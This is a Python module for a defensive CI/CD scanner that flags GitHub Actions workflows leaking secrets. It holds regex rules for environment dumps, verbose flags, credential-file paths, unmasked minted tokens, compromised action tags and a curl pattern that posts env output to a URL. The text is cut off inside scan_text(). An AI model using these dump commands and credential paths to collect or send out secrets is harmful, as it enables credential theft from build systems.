# CI/CD secret-leak detector tier.
#
# Wave 21 implementation of distill-round-7 angle F. This module catches
# leak-direction patterns the existing zizmor / sentinel / gha_reusable
# tier does NOT cover:
#
#   * Shell xtrace (`set -x`, `bash -x`, `Set-PSDebug -Trace`).
#   * Env-dump (`printenv`, `env >`, `set | tee`, `compgen -e`).
#   * Verbose / debug flags on common CLIs (`curl -v`, `aws --debug`,
#     `gcloud --log-http`, `pip -vv`, `kubectl -v=6+`).
#   * `actions/upload-artifact` or `actions/cache` of credential-laden
#     paths (`~/.npmrc`, `~/.pypirc`, `~/.docker/`, `~/.aws/`, `~/.kube/`,
#     `~/.ssh/`, `~/.netrc`, `~/.git-credentials`).
#   * Transformed secrets emitted to `$GITHUB_OUTPUT` / `::set-output::`
#     (echo of `$TOKEN`-derived value into output).
#   * `tj-actions/*` references at any tag below the CVE-2025-30066 fix.
#   * `actions/github-script` body that prints `process.env`
#     (or Python `print(os.environ)`, Ruby `puts ENV.to_h`, etc.).
#   * `if: failure()` / `if: always()` cleanup steps that dump env or
#     `cat` credential files post-failure.
#   * Workflow-level `env:` block containing a `${{ secrets.X }}` (broader
#     blast radius than job-level scoping).
#   * Minted runtime secrets emitted without preceding `::add-mask::`.
#   * `download-artifact` → `upload-artifact` re-export with secrets in
#     scope (re-broadcasts a secret-laden artifact to broader visibility).
#   * Job `outputs:` whose value is a literal `${{ secrets.X }}` (visible
#     in workflow_run API response, NOT mask-redacted).
#   * `bash -c` / `python -c` with `${{ secrets.X }}` inlined into argv.
#   * `runs-on: self-hosted` + credential-writing setup action with no
#     `if: always()` cleanup.
#
# All regex patterns are RE2-safe: no lookaround, no backrefs, bounded
# quantifiers, no nested alternations with shared prefixes.
#
# Severity vocabulary mirrors lib.sentinel.model: CRITICAL / HIGH /
# MAJOR / MINOR. Public Finding shape mirrors auth_flow_patterns.Finding
# so heartbeat detectors render cicd-leak rules alongside auth-flow
# rules uniformly.

from __future__ import annotations

import re
from typing import Any, NamedTuple, Optional

import yaml

# ---- Data model ---------------------------------------------------------


class Finding(NamedTuple):
    """A single rule match. Same shape as auth_flow_patterns.Finding."""

    rule_id: str
    line: int
    column: int
    matched_text: str
    severity: str
    description: str
    owasp_asi: str


class Rule(NamedTuple):
    """A rule definition. Patterns are PRE-COMPILED at module load."""

    id: str
    name: str
    severity: str
    description: str
    pattern: Optional[re.Pattern]  # noqa: UP006 - keep stdlib name
    owasp_asi: str


def _re(pattern: str) -> re.Pattern:
    """Compile a pattern with MULTILINE+UNICODE. Case is rule-specific."""
    return re.compile(pattern, re.MULTILINE | re.UNICODE)


def _rei(pattern: str) -> re.Pattern:
    """Compile a pattern with IGNORECASE+MULTILINE+UNICODE."""
    return re.compile(pattern, re.IGNORECASE | re.MULTILINE | re.UNICODE)


# ---- Severity constants -------------------------------------------------

SEV_CRITICAL = "CRITICAL"
SEV_HIGH = "HIGH"
SEV_MEDIUM = "MEDIUM"
SEV_LOW = "LOW"


# ---- Secret-name regex (shared) -----------------------------------------

# Matches env-var names whose tail tag is one of TOKEN / SECRET / PASSWORD
# / API[_]KEY / CREDENTIAL / PASS / PWD. Bounded length to keep RE2-safe.
_SECRET_NAME_TAIL = (
    r"(?:TOKEN|SECRET|PASSWORD|API_?KEY|CREDENTIAL|PASS|PWD)"
)
_SECRET_VAR_NAME_RE = re.compile(
    r"\b[A-Z][A-Z0-9_]{0,40}" + _SECRET_NAME_TAIL + r"[A-Z0-9_]{0,40}\b"
)


# ---- 1. CICD-LEAK-001: shell xtrace exposes expanded secrets ------------

# `set -x`, `set -o xtrace`, `bash -x`, `bash -o xtrace`, `sh -x`, etc.
# Bounded-length char class for flag letters. The `set -x` family must
# include an `x` in the flag bundle. `set -e` / `set -u` / `set -ex`
# starting with non-x letters are handled by anchoring `x` either as
# a single-letter flag or in a contiguous bundle.
_XTRACE_RE = _re(
    # `set -x` / `set -ex` / `set -xe` etc. — letter `x` anywhere in flag bundle.
    r"\bset\s+-[a-zA-Z]{0,8}x[a-zA-Z]{0,8}\b"
    r"|"
    r"\bset\s+-o\s+xtrace\b"
    r"|"
    # `bash -x`, `sh -x`, `zsh -x` (note: must precede the program ref,
    # and `x` is in the flag bundle).
    r"\b(?:bash|sh|zsh|ksh)\s+-[a-zA-Z]{0,8}x[a-zA-Z]{0,8}\b"
    r"|"
    r"\b(?:bash|sh|zsh|ksh)\s+-o\s+xtrace\b"
    r"|"
    # PowerShell xtrace equivalent.
    r"\bSet-PSDebug\s+-Trace\s+[12]\b"
)


# ---- 2. CICD-LEAK-002: env-dump shapes ----------------------------------

# Each alternative is a discrete dump shape. Bare `printenv` (with NO
# arg or with a redirection/pipe) dumps the full environment. `printenv
# PATH` (one named var) does NOT and is excluded by negative-look — but
# RE2 can't use lookahead, so we require either EOL/space-EOL or a
# redirection/pipe to qualify as a dump.
_ENVDUMP_RE = _re(
    # `printenv` at end-of-line OR followed by a pipe/redirect.
    r"(?:^|[\s;&|])printenv\s*(?:$|[\s;|>])"
    r"|"
    # `env > file`, `env >> file`, `env | cmd`, bare `env` at EOL.
    r"(?:^|[\s;&|])env\s*(?:>>?\s*\S+|\|\s*\w+|$|;)"
    r"|"
    # `set > file`, `set | cmd` (bare `set` is too FP-noisy — exclude).
    r"(?:^|[\s;&|])set\s*(?:>>?\s*\S+|\|\s*\w+)"
    r"|"
    # `declare -x` lists exported vars + values. `-xp` etc. variants.
    r"(?:^|[\s;&|])declare\s+-[a-z]*[xp][a-z]*\b"
    r"|"
    # `compgen -e` lists exported var names (recon precursor).
    r"(?:^|[\s;&|])compgen\s+-e\b"
    r"|"
    # `export > file`, `export | cmd`, bare `export` at EOL.
    r"(?:^|[\s;&|])export\s*(?:>>?\s*\S+|\|\s*\w+|$|;)"
    r"|"
    # PowerShell env enumeration.
    r"\bGet-ChildItem\s+Env:\s*"
    r"|"
    r"\bdir\s+env:\s*"
    r"|"
    # systemd self-hosted runner env dump.
    r"\bsystemctl\s+show-environment\b"
)


# ---- 3. CICD-LEAK-003: verbose/debug flag on credential-carrying tools --

# Catalog of debug-flagged tools. Each alternative is a single tool
# anchored at word boundary + the verbose flag. Bounded quantifiers
# (`[^\n]{0,400}`) avoid catastrophic backtracking.
#
# Architecture: regex matches the tool+flag; scan_text() does the
# severity refinement (HIGH only if a secret-shaped token appears in the
# same line; else MEDIUM).
_VERBOSE_DEBUG_RE = _re(
    # curl verbose / trace / include-headers.
    r"\bcurl\b[^\n]{0,400}(?:--verbose\b|--trace-ascii\b|--trace\b|--include\b|\s-v\b|\s-i\b)"
    r"|"
    # wget debug.
    r"\bwget\b[^\n]{0,400}(?:--debug\b|\s-d\b)"
    r"|"
    # git verbose / GIT_TRACE / GIT_CURL_VERBOSE.
    r"\bgit\b[^\n]{0,400}--verbose\b"
    r"|"
    r"\b(?:GIT_TRACE|GIT_CURL_VERBOSE|GIT_TRANSFER_TRACE|GIT_TRACE_PACKET|GIT_TRACE_SETUP)\s*=\s*[1-9]"
    r"|"
    # npm verbose, --loglevel=verbose|silly|info, -d/-dd/-ddd.
    r"\bnpm\b[^\n]{0,400}(?:--verbose\b|--loglevel=(?:verbose|silly|info)\b|\s-d{1,3}\b)"
    r"|"
    # yarn verbose / pnpm loglevel=debug.
    r"\byarn\b[^\n]{0,400}--verbose\b"
    r"|"
    r"\bpnpm\b[^\n]{0,400}--loglevel=debug\b"
    r"|"
    # pip / poetry / uv verbose.
    r"\bpip\b[^\n]{0,400}(?:--verbose\b|\s-v+\b)"
    r"|"
    r"\bpoetry\b[^\n]{0,400}(?:--verbose\b|\s-v+\b)"
    r"|"
    r"\buv\b[^\n]{0,400}(?:--verbose\b|\s-v\b)"
    r"|"
    # Docker debug & docker push/login/pull --debug.
    r"\bdocker\b[^\n]{0,400}--debug\b"
    r"|"
    # gh --verbose and gh api -i (response headers).
    r"\bgh\b[^\n]{0,400}(?:--verbose\b|\s-v\b)"
    r"|"
    r"\bgh\s+api\b[^\n]{0,400}\s-i\b"
    r"|"
    # AWS / GCP / Azure debug.
    r"\baws\b[^\n]{0,400}--debug\b"
    r"|"
    r"\bgcloud\b[^\n]{0,400}(?:--log-http\b|--verbosity=debug\b)"
    r"|"
    r"\baz\b[^\n]{0,400}--debug\b"
    r"|"
    # Terraform TF_LOG=DEBUG/TRACE.
    r"\bTF_LOG\s*=\s*(?:DEBUG|TRACE)\b"
    r"|"
    # Ansible -vvv / -vvvv.
    r"\bansible(?:-playbook|-galaxy)?\b[^\n]{0,400}\s-v{3,4}\b"
    r"|"
    # Helm --debug.
    r"\bhelm\b[^\n]{0,400}--debug\b"
    r"|"
    # kubectl -v=6 (or higher; logs request+response bodies).
    r"\bkubectl\b[^\n]{0,400}\s-v=[6-9]\b"
    r"|"
    r"\bkubectl\b[^\n]{0,400}\s-v=[1-9][0-9]+\b"
    r"|"
    # hub --verbose.
    r"\bhub\b[^\n]{0,400}(?:--verbose\b|\s-v\b)"
)


# Secret-token markers used to upgrade Rule 3's severity. Same-line
# presence of any of these alongside the verbose flag promotes from
# MEDIUM to HIGH.
_VERBOSE_AMPLIFIER_RE = _rei(
    r"\$\{\{\s*secrets\."
    r"|"
    r"\bAuthorization\s*:"
    r"|"
    r"\bBearer\b"
    r"|"
    r"--password\b"
    r"|"
    r"--token\b"
    r"|"
    r"\bGITHUB_TOKEN\b"
    r"|"
    r"\$\{?[A-Z][A-Z0-9_]*" + _SECRET_NAME_TAIL + r"[A-Z0-9_]*\}?"
)


# ---- 6. CICD-LEAK-006: transformed secret → $GITHUB_OUTPUT --------------

# `echo "key=...$<SECRET_VAR>..." >> $GITHUB_OUTPUT` — secret value
# (or transform thereof) leaves the masked layer and enters the job
# output map.
_OUTPUT_TRANSFORM_RE = _re(
    r"echo\s+[\"']?[A-Za-z_][A-Za-z0-9_]{0,40}\s*=[^>\n]*"
    r"\$(?:\{[A-Z][A-Z0-9_]*" + _SECRET_NAME_TAIL + r"[A-Z0-9_]*\}|[A-Z][A-Z0-9_]*"
    + _SECRET_NAME_TAIL + r"[A-Z0-9_]*)"
    r"[^>\n]*>>\s*[\"']?\$\{?GITHUB_OUTPUT\}?"
)


# Direct `${{ secrets.X }}` in a `run:` line ending `>> $GITHUB_OUTPUT`.
_OUTPUT_SECRET_EXPR_RE = _re(
    r"echo\s+[\"']?[A-Za-z_][A-Za-z0-9_]{0,40}\s*=[^>\n]*"
    r"\$\{\{\s*secrets\.[A-Z][A-Z0-9_]{0,80}"
    r"[^>\n]*>>\s*[\"']?\$\{?GITHUB_OUTPUT\}?"
)


# Deprecated `::set-output name=…::` form with a secret-shaped value.
_SET_OUTPUT_DEPRECATED_RE = _re(
    r"::set-output\s+name=[A-Za-z_][A-Za-z0-9_]{0,40}::[^\n]*"
    r"(?:\$GITHUB_TOKEN\b|\$\{\{\s*secrets\.[A-Z]"
    r"|\$\{?[A-Z][A-Z0-9_]*" + _SECRET_NAME_TAIL + r"[A-Z0-9_]*\}?)"
)


# ---- 7. CICD-LEAK-007: tj-actions/* compromised tags (CVE-2025-30066) ---

# Tag-shape match (anything ≤ v45.x) — final severity gate is the SHA
# allow-list checked structurally in scan_workflow().
_TJ_ACTIONS_COMPROMISED_TAG_RE = _re(
    r"uses:\s*tj-actions/(?:changed-files|branch-names|verify-changed-files|glob)@"
    r"(?:v(?:[0-9]|[1-3][0-9]|4[0-5])(?:\.[0-9]{1,3}){0,2}|HEAD|main|master)\b"
)


# Known-bad raw SHAs in the tj-actions incident — operators that
# updated to a tag but did not refresh the SHA pin. Add SHAs here as
# the quarantine list is updated.
_TJ_ACTIONS_BAD_SHAS: frozenset = frozenset({
    # 0e58ed8 — March 2025 incident commit (canonical example).
    "0e58ed867288f8e3e54fb8e1d2a4f0c4ce5b04d4",
})


# Other compromised supply-chain actions from the same incident class.
_COMPROMISED_ACTIONS_RE = _re(
    # reviewdog/action-setup < v1.3.0 (April 2025 incident).
    r"uses:\s*reviewdog/action-setup@"
    r"(?:v(?:[0-9]|1\.[0-2])(?:\.[0-9]{1,3}){0,2}|main|master|HEAD)\b"
    r"|"
    # dawidd6/action-download-artifact < v3.1.5 (December 2024).
    r"uses:\s*dawidd6/action-download-artifact@"
    r"(?:v(?:[0-2]|3(?:\.[0-1](?:\.[0-4])?)?)|main|master|HEAD)\b"
)


# ---- 8. CICD-LEAK-008: github-script / Node printing process.env --------

# Inline JS in `actions/github-script` (or any node-based step that
# console.logs the env). The pattern matches inside any text — the
# YAML-context narrowing happens in scan_workflow().
_GITHUB_SCRIPT_ENV_DUMP_RE = _re(
    # console.log(process.env) — bare env, or .ACCESSOR form. The
    # post-filter in scan_text() distinguishes specific-non-secret
    # accessors (NODE_VERSION → drop) from specific-secret accessors
    # (PROD_TOKEN → keep) from the bare-env form (always keep).
    r"console\.(?:log|info|warn|error|debug|dir)\s*\("
    r"\s*(?:JSON\.stringify\s*\(\s*)?process\.env(?:\.[A-Z_][A-Z0-9_]{0,80})?"
    r"|"
    # console.<x>(... Object.entries(process.env) ...)
    r"console\.[a-z]+\s*\([^)]{0,200}Object\.entries\s*\(\s*process\.env"
    r"|"
    # console.<x>(... ${{ secrets.X }} ...)
    r"console\.[a-z]+\s*\([^)]{0,200}\$\{\{\s*secrets\.[A-Z]"
    r"|"
    # core.info(... process.env ...)
    r"core\.(?:info|warning|error|notice|debug)\s*\([^)]{0,200}process\.env"
    r"|"
    # core.exportVariable(name, JSON.stringify(secret_or_env))
    r"core\.exportVariable\s*\([^,]{0,80},\s*JSON\.stringify\s*\("
    r"|"
    # Python: print(os.environ) or print(dict(os.environ))
    r"python(?:3)?\s+-c\s+[\"'][^\"'\n]{0,200}\bprint\s*\(\s*(?:dict\s*\(\s*)?os\.environ"
    r"|"
    # Ruby: puts ENV.to_h
    r"\bputs\s+ENV(?:\.to_h|\.to_a|\.inspect)?"
    r"|"
    # Go: fmt.Println(os.Environ())
    r"fmt\.(?:Println|Printf|Print)\s*\(\s*os\.Environ\s*\(\s*\)\s*\)"
)


# ---- 14. CICD-LEAK-014: bash -c / python -c with ${{ secrets.X }} -------

# `bash -c "...${{ secrets.X }}..."` puts the expanded secret in argv,
# visible via `/proc/<pid>/cmdline` and audit logs. The interpreter `-c`
# string can be wrapped in `"` or `'` and may contain the opposite quote
# nested (`python -c "print('${{...}}')"`), so the body class allows
# both quote characters except a NEWLINE.
_INTERPRETER_C_SECRET_RE = _re(
    r"(?:^|[\s;|&])(?:bash|sh|zsh|ksh|python(?:3|2)?|node|ruby|perl|php)\s+-c\s+"
    r"[\"'][^\n]{0,500}\$\{\{\s*secrets\.[A-Z][A-Z0-9_]{0,80}"
    r"|"
    # cmd.exe equivalent.
    r"(?:^|[\s;|&])cmd(?:\.exe)?\s+/c\s+"
    r"[\"'][^\n]{0,500}\$\{\{\s*secrets\.[A-Z][A-Z0-9_]{0,80}"
)


# ---- Credential-laden path list (Proposal 4) ----------------------------

# Paths that, when uploaded as artifact or cached, exfiltrate secrets.
# RE2-safe: each alternative is a literal-or-bounded-glob, no nesting.
_CREDENTIAL_PATHS_RE = _re(
    r"~/\.docker(?:/config\.json)?"
    r"|"
    r"~/\.npmrc"
    r"|"
    r"~/\.pypirc"
    r"|"
    r"~/\.netrc"
    r"|"
    r"~/\.aws(?:/credentials|/config)?"
    r"|"
    r"~/\.kube(?:/config)?"
    r"|"
    r"~/\.ssh(?:/id_(?:rsa|ed25519|ecdsa|dsa)(?:\.pub)?)?"
    r"|"
    r"~/\.git-credentials"
    r"|"
    r"~/\.claude/credentials\.json"
    r"|"
    r"~/\.config/pip"
    r"|"
    r"~/\.config/gh"
    r"|"
    r"\$\{?HOME\}?/\.[a-z][a-z0-9_-]{0,40}rc"
    r"|"
    r"/etc/secrets/"
    r"|"
    r"/var/run/secrets/"
    r"|"
    r"/home/runner/\.dotnet/"
    r"|"
    r"\$\{?GITHUB_WORKSPACE\}?/[^\s]{0,120}\.env(?:\.[a-z]{1,30})?"
)


# Heuristic: paths that LOOK suspicious because they're broad globs
# that could match credential files. Lower-confidence — HIGH not
# CRITICAL.
_BROAD_GLOB_PATHS_RE = _re(
    r"^~/?$"
    r"|"
    r"^~/\.\*?$"
    r"|"
    r"^/home/runner/?$"
)


# ---- 11. CICD-LEAK-011: minted runtime secret without ::add-mask:: ------

# Commands that mint a runtime secret value the runner has never seen.
_MINT_COMMAND_RE = _re(
    r"\baws\s+sts\s+assume-role(?:-with-web-identity)?\b"
    r"|"
    r"\bgcloud\s+auth\s+print-(?:access|identity)-token\b"
    r"|"
    r"\baz\s+account\s+get-access-token\b"
    r"|"
    r"\bvault\s+(?:kv\s+get|read)\b"
    r"|"
    r"\bgh\s+auth\s+token\b"
    r"|"
    r"\bgh\s+api\b[^\n]{0,200}--jq\s+[\"']?\.token"
    r"|"
    r"\bkubectl\b[^\n]{0,200}\bbase64\s+-d\b"
    r"|"
    r"\bop\s+read\s+op://"
    r"|"
    r"\bbw\s+get\s+(?:password|item)\b"
)


# Emit shape — the mint-output landing site we care about.
_MINT_EMIT_RE = _re(
    r">>\s*[\"']?\$\{?GITHUB_(?:OUTPUT|ENV)\}?"
    r"|"
    r"::set-output\s+name="
)


# `::add-mask::` literal. If absent between the mint and the emit, fire.
_ADD_MASK_RE = _re(r"::add-mask::")


# ---- 9. CICD-LEAK-009: post-failure forensics leak ----------------------

# A step's `run:` body that dumps credentials or env. Same as Rule 2
# but scoped — the structural rule in scan_workflow() checks the
# step's `if:` value.
_POST_FAILURE_DUMP_RE = _re(
    r"(?:^|[\s;&|])printenv\s*(?:$|[\s;|>])"
    r"|"
    r"(?:^|[\s;&|])env\s*(?:>>?\s*\S+|\|\s*\w+|$|;)"
    r"|"
    r"(?:^|[\s;&|])set\s*\|"
    r"|"
    r"(?:^|[\s;&|])cat\s+~/\.(?:npmrc|pypirc|netrc|docker/|aws/|kube/|ssh/|git-credentials|claude/)"
    r"|"
    r"(?:^|[\s;&|])cat\s+\$GITHUB_(?:ENV|OUTPUT)"
)


# Exfil shape — curl posting the env to an attacker-controlled URL.
_POST_FAILURE_EXFIL_RE = _re(
    r"\bcurl\b[^\n]{0,200}-d\s+[\"']?\$\(\s*(?:env|printenv)\s*\)"
)


# ---- Negative-context guards --------------------------------------------

# `set +x` (turn xtrace OFF). If a `set -x` is immediately followed by a
# `set +x` on a later line with no secret-touching command between,
# we suppress.
_SET_OFF_RE = _re(r"\bset\s+\+[a-zA-Z]{0,8}x[a-zA-Z]{0,8}\b")

# Allow-list for verbose flag on tools that don't log HTTP details.
_VERBOSE_ALLOWLIST_RE = _re(
    r"\b(?:make|cmake|ninja|cargo|rustc|gcc|g\+\+|clang)\s+(?:--verbose|-v)\b"
)


# ---- Helpers ------------------------------------------------------------


def _line_col(text: str, offset: int) -> tuple[int, int]:
    """Convert a string offset into (1-based line, 1-based column)."""
    before = text[:offset]
    line = before.count("\n") + 1
    col = offset - (before.rfind("\n") + 1) + 1
    return (line, col)


def _line_text(text: str, line_no: int) -> str:
    """Return the full text of the 1-based line_no without trailing newline."""
    lines = text.split("\n")
    if 1 <= line_no <= len(lines):
        return lines[line_no - 1]
    return ""


def _make_finding(
    rule_id: str,
    severity: str,
    line: int,
    column: int,
    matched_text: str,
    description: str,
    owasp_asi: str,
) -> Finding:
    if len(matched_text) > 200:
        matched_text = matched_text[:200] + "…"
    return Finding(
        rule_id=rule_id,
        line=max(line, 1),
        column=max(column, 1),
        matched_text=matched_text,
        severity=severity,
        description=description,
        owasp_asi=owasp_asi,
    )


# ---- The rule catalogue (metadata only; runtime is in scan_*) ----------

RULES: tuple[Rule, ...] = (
    Rule(
        id="cicd-leak-shell-xtrace",
        name="Shell xtrace (`set -x` / `bash -x`) exposes expanded secrets",
        severity=SEV_HIGH,
        description=(
            "Bash xtrace (`set -x`, `set -o xtrace`, `bash -x`, `sh -x`) "
            "prints every command line AFTER variable expansion to "
            "stderr. If the step has `env: TOKEN: ${{ secrets.X }}` and "
            "runs a curl Authorization-header step, the trace literally "
            "emits the secret value. GitHub's mask layer catches only "
            "REGISTERED secret strings — xtrace bypasses every transform "
            "by emitting the raw expansion. CWE-532 / CICD-SEC-6. "
            "Includes the PowerShell equivalent `Set-PSDebug -Trace 1`."
        ),
        pattern=_XTRACE_RE,
        owasp_asi="ASI-04",
    ),
    Rule(
        id="cicd-leak-env-dump",
        name="`printenv` / `env >` / `set | tee` dumps full env to logs or files",
        severity=SEV_CRITICAL,
        description=(
            "The full process environment of a runner contains every "
            "secret mapped via `env:` plus runner internals "
            "(ACTIONS_RUNTIME_TOKEN, ACTIONS_CACHE_URL) that grant write "
            "access to artifact / cache storage. `printenv`, `env >`, "
            "`set | tee`, `declare -x`, `compgen -e`, and the PowerShell "
            "`Get-ChildItem Env:` all dump the whole env in clear text. "
            "CWE-532 / CICD-SEC-6."
        ),
        pattern=_ENVDUMP_RE,
        owasp_asi="ASI-04",
    ),
    Rule(
        id="cicd-leak-verbose-debug-flag",
        name="Client-tool `--verbose` / `--debug` flag logs Authorization headers",
        severity=SEV_HIGH,
        description=(
            "Most CLI tools log the HTTP request line + headers under a "
            "verbose / debug flag. When the request carries a token "
            "(`Authorization: Bearer ...`, `--token X`, `?api_key=X`), "
            "that token lands in the workflow log. Catalog: curl -v, "
            "wget -d, GIT_TRACE=1, npm --verbose, pip -vvv, docker "
            "--debug, gh --verbose, aws --debug, gcloud --log-http, az "
            "--debug, TF_LOG=DEBUG, ansible -vvv, helm --debug, kubectl "
            "-v=6+. CWE-532 / CICD-SEC-6."
        ),
        pattern=_VERBOSE_DEBUG_RE,
        owasp_asi="ASI-04",
    ),
    Rule(
        id="cicd-leak-artifact-credential-path",
        name="`upload-artifact` of credential-laden path (~/.npmrc, ~/.pypirc, etc.)",
        severity=SEV_CRITICAL,
        description=(
            "`actions/upload-artifact` whose `path:` references a "
            "credential file (`~/.npmrc`, `~/.pypirc`, `~/.docker/`, "
            "`~/.aws/`, `~/.kube/`, `~/.ssh/`, `~/.netrc`, "
            "`~/.git-credentials`) publishes the secrets as a "
            "downloadable artifact — visible to anyone with read access "
            "to the run (public for public repos). CWE-532 / CICD-SEC-6."
        ),
        pattern=None,  # structural — see scan_workflow().
        owasp_asi="ASI-04",
    ),
    Rule(
        id="cicd-leak-cache-credential-path",
        name="`actions/cache` of credential-laden directory (cross-workflow read)",
        severity=SEV_HIGH,
        description=(
            "`actions/cache` writes the contents of `path:` to GHA's "
            "cache backend, retrievable by ANY other workflow on the "
            "same repo. If `~/.npmrc` / `~/.pypirc` get cached, a fork "
            "PR workflow (no secrets in scope) can issue a cache "
            "restore and pull the publish token. Silent — no artifact "
            "tab shows it. CWE-532 / CICD-SEC-3."
        ),
        pattern=None,  # structural — see scan_workflow().
        owasp_asi="ASI-05",
    ),
    Rule(
        id="cicd-leak-github-output-transform",
        name="Transformed secret value emitted to `$GITHUB_OUTPUT`",
        severity=SEV_HIGH,
        description=(
            "GitHub Actions masks SECRET values in logs but NOT in step "
            "or job `outputs`. Emitting a derivative of a secret (sha256, "
            "base64, first-N chars) to `$GITHUB_OUTPUT` produces a value "
            "the masker has never seen — it survives into the downstream "
            "job's `needs.X.outputs.Y` and the workflow_run API response. "
            "Also catches the deprecated `::set-output name=...::` form. "
            "CWE-532 / CICD-SEC-4."
        ),
        pattern=_OUTPUT_TRANSFORM_RE,
        owasp_asi="ASI-04",
    ),
    Rule(
        id="cicd-leak-tj-actions-compromised",
        name="`tj-actions/*` at a tag below CVE-2025-30066 fix",
        severity=SEV_CRITICAL,
        description=(
            "CVE-2025-30066 (March 2025): `tj-actions/changed-files` "
            "and sibling repos had their git history rewritten to point "
            "every tag at a malicious commit that base64-decoded a "
            "secret-stealing payload into the workflow log. Affected "
            "every workflow at any tag below the post-incident clean "
            "tag (`v46.0.5+`). Pin to a known-good 40-hex SHA. CWE-510 / "
            "CICD-SEC-3."
        ),
        pattern=_TJ_ACTIONS_COMPROMISED_TAG_RE,
        owasp_asi="ASI-05",
    ),
    Rule(
        id="cicd-leak-github-script-env-dump",
        name="`actions/github-script` (or inline Node/Python) prints `process.env`",
        severity=SEV_HIGH,
        description=(
            "Inline Node/Python/Ruby/Go steps that `console.log("
            "process.env)`, `print(os.environ)`, `puts ENV.to_h`, or "
            "`fmt.Println(os.Environ())` produce a transformed string "
            "the runner mask has never seen, bypassing GHA's secret "
            "redaction. CWE-532 / CICD-SEC-6."
        ),
        pattern=_GITHUB_SCRIPT_ENV_DUMP_RE,
        owasp_asi="ASI-04",
    ),
    Rule(
        id="cicd-leak-post-failure-forensics",
        name="`if: failure()` / `if: always()` step dumps env or cred files",
        severity=SEV_MEDIUM,
        description=(
            "Post-failure cleanup steps with `if: failure()` / "
            "`if: always()` that run `env`, `printenv`, `cat ~/.npmrc`, "
            "`cat ~/.docker/config.json`, etc. expose secrets in the "
            "failed run's logs — which are MORE likely to be public "
            "(fork-PR failures, operator forgot to suppress). "
            "Upgraded to CRITICAL when paired with `curl <attacker-url> "
            "-d \"$(env)\"`. CWE-532 / CICD-SEC-6."
        ),
        pattern=None,  # structural.
        owasp_asi="ASI-04",
    ),
    Rule(
        id="cicd-leak-workflow-env-secret",
        name="Workflow-level `env:` block with secret reference (broad blast radius)",
        severity=SEV_MEDIUM,
        description=(
            "GHA scopes `env:` at workflow / job / step. A "
            "workflow-level `env: { TOKEN: ${{ secrets.X }} }` exposes "
            "the secret to EVERY job and EVERY step — including test "
            "jobs that don't need it. Least-privilege says: pin the "
            "secret to the smallest scope. Upgrades to HIGH on "
            "multi-job workflows. CWE-269 / CICD-SEC-5."
        ),
        pattern=None,  # structural.
        owasp_asi="ASI-05",
    ),
    Rule(
        id="cicd-leak-mint-without-mask",
        name="Runtime-minted secret emitted without preceding `::add-mask::`",
        severity=SEV_HIGH,
        description=(
            "Steps that mint a secret at runtime "
            "(`aws sts assume-role`, `gcloud auth print-access-token`, "
            "`vault read`, `gh auth token`, `kubectl ... base64 -d`, "
            "`op read`, `bw get password`) and then emit the value to "
            "`$GITHUB_OUTPUT` / `$GITHUB_ENV` without first calling "
            "`echo \"::add-mask::$VALUE\"` leak the plaintext — the "
            "runner has not registered the value with its masker. "
            "CWE-532 / CICD-SEC-6."
        ),
        pattern=None,  # structural.
        owasp_asi="ASI-04",
    ),
    Rule(
        id="cicd-leak-download-then-reupload",
        name="`download-artifact` → `upload-artifact` re-export with secrets in scope",
        severity=SEV_HIGH,
        description=(
            "A job downloads an artifact from a prior run "
            "(`actions/download-artifact`) and re-uploads its contents "
            "(`actions/upload-artifact`) while the job also has "
            "`secrets:` or `env: { TOKEN: ${{ secrets.X }} }` in scope. "
            "Re-broadcasts a secret-laden artifact to broader "
            "visibility. CWE-532 / CICD-SEC-6."
        ),
        pattern=None,  # structural.
        owasp_asi="ASI-04",
    ),
    Rule(
        id="cicd-leak-job-outputs-secret",
        name="Job `outputs:` block with literal `${{ secrets.X }}` value",
        severity=SEV_HIGH,
        description=(
            "A job that declares `outputs: { api_key: ${{ secrets.X }} }` "
            "publishes the secret to the run's metadata — visible via "
            "`gh api /repos/:o/:r/actions/runs/:id/jobs` to anyone with "
            "read access. The runner log mask does NOT cover the API "
            "response body. CWE-532 / CICD-SEC-6."
        ),
        pattern=None,  # structural.
        owasp_asi="ASI-04",
    ),
    Rule(
        id="cicd-leak-interpreter-c-secret",
        name="`bash -c` / `python -c` with `${{ secrets.X }}` inlined in argv",
        severity=SEV_HIGH,
        description=(
            "Direct interpolation of `${{ secrets.X }}` into a shell or "
            "interpreter `-c` argument means the secret value is "
            "literally in the process's argv — visible via "
            "`/proc/<pid>/cmdline`, audit-log subsystems, and core "
            "dumps. CWE-214 / CICD-SEC-6."
        ),
        pattern=_INTERPRETER_C_SECRET_RE,
        owasp_asi="ASI-04",
    ),
    Rule(
        id="cicd-leak-self-hosted-no-cleanup",
        name="Self-hosted runner + credential-writing setup + no cleanup step",
        severity=SEV_HIGH,
        description=(
            "Self-hosted runners DO NOT clean filesystem state between "
            "jobs. A workflow that runs `actions/setup-node` writes a "
            "token to `~/.npmrc`; on completion the file persists for "
            "the next workflow run (potentially from a fork PR) to read. "
            "CWE-1188 / CICD-SEC-7."
        ),
        pattern=None,  # structural.
        owasp_asi="ASI-05",
    ),
)


# ---- Regex scanner (pure-text rules) ------------------------------------


# Map from rule_id → (compiled_re, severity, description, owasp_asi).
# Built once at module load.
_TEXT_RULES: dict[str, tuple[re.Pattern, str, str, str]] = {}
for _r in RULES:
    if _r.pattern is not None:
        _TEXT_RULES[_r.id] = (_r.pattern, _r.severity, _r.description, _r.owasp_asi)


# Suppression: `set -x` followed by `set +x` on a later line with no
# secret-touching command between -> drop the original `set -x` hit.
def _suppress_xtrace_with_reset(text: str, hit_line: int) -> bool:
    """True iff the same-step's xtrace is balanced by a `set +x` with no
    secret-touching command in between."""
    # Look forward up to 20 lines for a `set +x` AND no secret reference.
    lines = text.split("\n")
    start = hit_line  # 1-based, we look from next line
    end = min(len(lines), hit_line + 20)
    saw_set_off = False
    saw_secret_use = False
    for i in range(start, end):
        ln = lines[i]
        if _SET_OFF_RE.search(ln):
            saw_set_off = True
            break
        if (
            "secrets." in ln
            or _SECRET_VAR_NAME_RE.search(ln) is not None
            or "$TOKEN" in ln
            or "GITHUB_TOKEN" in ln
        ):
            saw_secret_use = True
    return saw_set_off and not saw_secret_use


def scan_text(text: str) -> list[Finding]:
    """Run every regex-based rule on `text`. RE2-safe by construction.

    Caller for: arbitrary shell snippets, `run:` blocks pulled out of YAML,
    raw `.gitlab-ci.yml` content, etc. Composite-action and workflow
    structural rules live in `scan_workflow()`.
    """
    if not text:
        return []

    findings: list[Finding] = []
    seen: set[tuple[str, int, int]] = set()

    for rule_id, (pat, severity, desc, owasp) in _TEXT_RULES.items():
        for m in pat.finditer(text):
